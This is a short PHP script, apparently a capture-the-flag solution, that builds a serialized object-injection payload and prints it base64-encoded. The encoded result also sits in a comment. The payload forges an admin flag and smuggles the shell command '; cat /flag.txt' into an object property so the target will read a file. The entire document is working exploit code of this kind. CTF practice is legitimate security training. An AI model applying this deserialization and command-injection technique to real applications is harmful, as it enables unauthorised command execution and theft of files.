<?php
//YToyOntpOjA7Tzo3OiJhZGRLaWxsIjoxOntzOjY6ImtpbGxtZSI7czoxNToiOyBjYXQgL2ZsYWcudHh0Ijt9aToxO086OToiTWFpbkNsYXNzIjoxOntzOjQ6Im5hbWUiO086OToiS2lsbGVySm9iIjoxOntzOjc6ImlzQWRtaW4iO2I6MTt9fX0=
class KillerJob {
    function __construct($isAdmin){
        $this->isAdmin = $isAdmin;
    }
}
class addKill {
    function __construct($killme){
        $this->killme = $killme;
    }
}
class MainClass {
    function __construct(){
        $this->name = new KillerJob(true);
    }
}
echo base64_encode(serialize(array(new addKill("; cat /flag.txt"), new MainClass())));
?>
